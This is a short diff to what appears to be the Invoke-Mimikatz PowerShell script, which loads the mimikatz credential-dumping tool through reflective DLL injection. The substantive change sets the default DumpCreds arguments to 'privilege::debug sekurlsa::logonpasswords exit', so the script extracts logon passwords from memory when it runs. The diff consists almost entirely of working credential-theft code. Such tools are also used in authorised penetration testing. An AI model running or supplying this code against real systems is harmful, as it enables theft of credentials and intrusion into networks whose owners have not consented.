@@ -62,6 +62,7 @@ Find mimikatz at: http://blog.gentilkiwi.com
 
 http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
 #>
+
 [CmdletBinding(DefaultParameterSetName="DumpCreds")]
 Param(
 	[Parameter(Position = 0)]
@@ -2699,7 +2700,7 @@ Function Main
 
 	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
 	{
-		$ExeArgs = "privilege::debug"
+		$ExeArgs = "privilege::debug sekurlsa::logonpasswords exit"
 	}
     elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
     {
